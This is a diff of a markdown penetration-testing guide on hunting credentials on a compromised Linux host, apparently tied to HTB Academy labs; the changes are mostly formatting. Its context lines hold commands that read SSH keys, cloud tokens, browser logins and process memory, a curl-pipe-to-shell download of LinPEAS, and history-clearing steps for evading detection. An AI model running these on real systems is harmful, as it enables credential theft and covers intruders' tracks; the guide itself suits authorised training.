@@ -1,22 +1,23 @@
-# Credential Hunting in Linux
+# 🔍 Credential Hunting in Linux
 
 ## 🎯 Overview
 
 **Linux credential hunting** focuses on discovering credentials stored in configuration files, history files, environment variables, and system logs after gaining access to a Linux system. Linux systems often contain:
 
-- **SSH private keys** and certificates
-- **Database connection strings** in application configs
-- **API keys and tokens** in environment files
-- **Service account credentials** in systemd units
-- **Application passwords** in configuration files
-- **Command history** with embedded credentials
-- **Container secrets** and orchestration configs
+* **SSH private keys** and certificates
+* **Database connection strings** in application configs
+* **API keys and tokens** in environment files
+* **Service account credentials** in systemd units
+* **Application passwords** in configuration files
+* **Command history** with embedded credentials
+* **Container secrets** and orchestration configs
 
 > **"In Linux environments, credentials are often stored in plain text configuration files, making systematic file hunting extremely effective."**
 
 ## 🧠 Linux-Specific Credential Locations
 
 ### System Configuration Directories
+
 ```bash
 /etc/                    # System-wide configuration files
 /etc/passwd              # User account information  
@@ -29,6 +30,7 @@
 ```
 
 ### User-Specific Locations
+
 ```bash
 ~/.ssh/                  # SSH keys and configuration
 ~/.aws/                  # AWS credentials
@@ -42,6 +44,7 @@
 ```
 
 ### Application-Specific Paths
+
 ```bash
 /var/www/                # Web application files
 /opt/                    # Third-party applications
@@ -55,6 +58,7 @@
 ## 🎯 HTB Academy Enhanced Techniques
 
 ### HTB Academy File Extension Search Method
+
 **One-liner approach for systematic file discovery by extension:**
 
 ```bash
@@ -75,6 +79,7 @@ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 ```
 
 ### HTB Academy Log Analysis Method
+
 **Targeted log file analysis for authentication and credential events:**
 
 ```bash
@@ -92,6 +97,7 @@ ls -la /etc/cron.*/
 ## 🔍 File System Search Techniques
 
 ### 1. Find Command - File Discovery
+
 ```bash
 # Search for files with "password" in filename
 find / -name "*password*" -type f 2>/dev/null
@@ -122,6 +128,7 @@ find / -type f -perm -o+r -name "*secret*" 2>/dev/null
 ```
 
 ### 2. Grep Command - Content Searching
+
 ```bash
 # Search for password patterns in files
 grep -r -i "password" /etc/ /var/ /opt/ 2>/dev/null
@@ -149,6 +156,7 @@ grep -r -i -E "(BEGIN.*KEY|END.*KEY)" /etc/ /var/ /opt/ 2>/dev/null
 ```
 
 ### 3. Advanced Search Patterns
+
 ```bash
 # Multi-pattern search
 grep -r -i -E "(password|passwd|pwd|secret|key|token|auth|cred|login|user)" /etc/ 2>/dev/null
@@ -172,6 +180,7 @@ grep -r -i -E "(server=|host=|hostname=|database=|db=)" /etc/ /var/ /opt/ 2>/dev
 ## 📂 Specific Configuration File Hunting
 
 ### SSH Configuration and Keys
+
 ```bash
 # SSH client configuration
 cat ~/.ssh/config
@@ -193,6 +202,7 @@ cat /etc/ssh/ssh_known_hosts
 ```
 
 ### Database Configuration Files
+
 ```bash
 # MySQL/MariaDB
 cat /etc/mysql/my.cnf
@@ -214,6 +224,7 @@ find / -name "redis.conf" 2>/dev/null
 ```
 
 ### Web Application Configurations
+
 ```bash
 # Apache
 cat /etc/apache2/apache2.conf
@@ -239,6 +250,7 @@ find /var/www/ -name "config.json" -o -name "app.js"
 ## 🕰️ History File Analysis
 
 ### Command History Files
+
 ```bash
 # Bash history
 cat ~/.bash_history
@@ -259,6 +271,7 @@ find / -name "*history*" -type f -exec grep -l -i "password\|secret\|key" {} \; 
 ```
 
 ### Application History Files
+
 ```bash
 # MySQL command history
 cat ~/.mysql_history
@@ -281,6 +294,7 @@ cat ~/.viminfo | grep -i -E "(password|secret|key)"
 ## 🌐 Environment Variables and Process Analysis
 
 ### Environment Variable Hunting
+
 ```bash
 # Current environment variables
 env | grep -i -E "(password|secret|key|token|auth)"
@@ -299,6 +313,7 @@ cat /etc/environment
 ```
 
 ### Service and Daemon Analysis
+
 ```bash
 # Systemd service files
 find /etc/systemd/ -name "*.service" -exec grep -l -i -E "(password|secret|key)" {} \;
@@ -318,6 +333,7 @@ for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $use
 ## 📊 Log File Analysis
 
 ### System Logs
+
 ```bash
 # Authentication logs
 grep -i -E "(password|failed|success)" /var/log/auth.log
@@ -336,6 +352,7 @@ grep -i -E "(password|login|auth)" /var/log/nginx/access.log
 ```
 
 ### Application-Specific Logs
+
 ```bash
 # Database logs
 find /var/log/ -name "*mysql*" -exec grep -l -i "password" {} \;
@@ -351,6 +368,7 @@ grep -i -E "(password|login|user)" /var/log/vsftpd.log
 ## 🔧 Linux-Specific Tools and Techniques
 
 ### 1. Mimipenguin - Linux Memory Credential Extraction
+
 ```bash
 # Download mimipenguin
 wget https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin.py
@@ -364,14 +382,16 @@ sudo python3 mimipenguin.py
 ```
 
 **Mimipenguin extracts credentials from:**
-- GNOME Keyring
-- VSFTPd processes
-- Apache2 processes
-- SSH agent processes
-- IRSSI IRC client
-- Various system processes
+
+* GNOME Keyring
+* VSFTPd processes
+* Apache2 processes
+* SSH agent processes
+* IRSSI IRC client
+* Various system processes
 
 ### 2. LaZagne for Linux
+
 ```bash
 # Download and run LaZagne
 wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne
@@ -393,6 +413,7 @@ sudo python2.7 laZagne.py all
 ```
 
 ### 3. Firefox Decrypt - Browser Credential Extraction
+
 ```bash
 # Download firefox_decrypt
 wget https://github.com/unode/firefox_decrypt/raw/master/firefox_decrypt.py
@@ -414,6 +435,7 @@ python3 laZagne.py browsers
 ```
 
 **Firefox credential files:**
+
 ```bash
 # Firefox stored credentials location
 ~/.mozilla/firefox/[profile]/logins.json
@@ -427,6 +449,7 @@ cat ~/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 ```
 
 ### 4. LinPEAS (Linux Privilege Escalation Awesome Scripts)
+
 ```bash
 # Download and run LinPEAS
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
@@ -438,6 +461,7 @@ chmod +x linpeas.sh
 ```
 
 ### 5. Custom Linux Credential Scripts
+
 ```bash
 #!/bin/bash
 # credHunter.sh - Linux credential hunting script
@@ -461,6 +485,7 @@ find / -type f -mtime -1 2>/dev/null | head -20
 ## 🐳 Container and Orchestration Credential Hunting
 
 ### Docker Credential Hunting
+
 ```bash
 # Docker configuration
 cat ~/.docker/config.json
@@ -480,6 +505,7 @@ ls -la /var/lib/docker/swarm/
 ```
 
 ### Kubernetes Credential Hunting
+
 ```bash
 # Kubernetes configuration
 cat ~/.kube/config
@@ -498,6 +524,7 @@ kubectl describe pods --all-namespaces 2>/dev/null | grep -i -A5 -B5 "Environmen
 ## 🔍 Memory and Process Credential Extraction
 
 ### Process Memory Analysis
+
 ```bash
 # Dump process memory (requires appropriate privileges)
 gcore <PID>
@@ -514,6 +541,7 @@ cat /proc/*/environ | strings | grep -i -E "(password|secret|key|token)"
 ```
 
 ### System Memory Analysis
+
 ```bash
 # Dump physical memory (requires root)
 dd if=/dev/mem of=memory.dump bs=1M count=100 2>/dev/null
@@ -526,6 +554,7 @@ strings /dev/kmem | grep -i -E "(password|secret|key)" 2>/dev/null
 ## 📋 Systematic Linux Credential Hunting Checklist
 
 ### Phase 1: Initial Reconnaissance
+
 ```bash
 # System information
 uname -a
@@ -540,6 +569,7 @@ ls -la ~
 ```
 
 ### Phase 2: File System Discovery
+
 ```bash
 # Find credential-related files
 find / -name "*password*" -o -name "*secret*" -o -name "*key*" -o -name "*cred*" 2>/dev/null
@@ -552,6 +582,7 @@ find /home/ -name ".*" -type f 2>/dev/null | head -50
 ```
 
 ### Phase 3: Content Analysis
+
 ```bash
 # Search file contents
 grep -r -i -E "(password|passwd|secret|key|token)" /etc/ 2>/dev/null | head -20
@@ -560,6 +591,7 @@ grep -r -i -E "(password|passwd|secret|key|token)" /opt/ 2>/dev/null | head -20
 ```
 
 ### Phase 4: History and Environment
+
 ```bash
 # Command history
 cat ~/.bash_history | grep -i -E "(ssh|mysql|password|secret)"
@@ -573,6 +605,7 @@ ps aux | grep -v grep
 ```
 
 ### Phase 5: Application-Specific Hunting
+
 ```bash
 # Web applications
 find /var/www/ -name "*.php" -o -name "*.py" -o -name "*.js" | xargs grep -l -i "password" 2>/dev/null
@@ -588,6 +621,7 @@ cat ~/.ssh/config 2>/dev/null
 ## 🛡️ Detection Evasion for Linux
 
 ### Stealth Techniques
+
 ```bash
 # Use built-in commands instead of external tools
 grep instead of custom scanners
@@ -603,6 +637,7 @@ grep -r "password" <(find /etc/ -name "*.conf" 2>/dev/null)
 ```
 
 ### Cleanup Commands
+
 ```bash
 # Clear command history
 history -c
@@ -620,11 +655,13 @@ unset SECRET_KEY
 ## 🎯 HTB Academy Lab Example
 
 ### Lab Scenario
-- **Target**: SSH access to Linux system
-- **Initial Access**: `ssh kira@TARGET_IP` with password `L0vey0u1!`
-- **Objective**: Find the password of user "Will"
+
+* **Target**: SSH access to Linux system
+* **Initial Access**: `ssh kira@TARGET_IP` with password `L0vey0u1!`
+* **Objective**: Find the password of user "Will"
 
 ### Systematic Approach
+
 ```bash
 # Step 1: Initial system reconnaissance
 whoami
@@ -659,6 +696,7 @@ python3 firefox_decrypt.py
 ```
 
 ### Common Discovery Patterns
+
 1. **Password in bash history** - Previous commands containing Will's password
 2. **Configuration files** - Application configs with embedded credentials
 3. **Text files** - Documentation or note files with passwords
@@ -678,6 +716,6 @@ python3 firefox_decrypt.py
 9. **HTB Academy methodology** - Systematic file extension searches are highly effective
 10. **Memory-based tools** - Mimipenguin complements file-based searches
 
----
+***
 
-*This comprehensive guide covers Linux credential hunting techniques for post-exploitation scenarios and penetration testing engagements, enhanced with HTB Academy specific methods and tools.* 
+_This comprehensive guide covers Linux credential hunting techniques for post-exploitation scenarios and penetration testing engagements, enhanced with HTB Academy specific methods and tools._
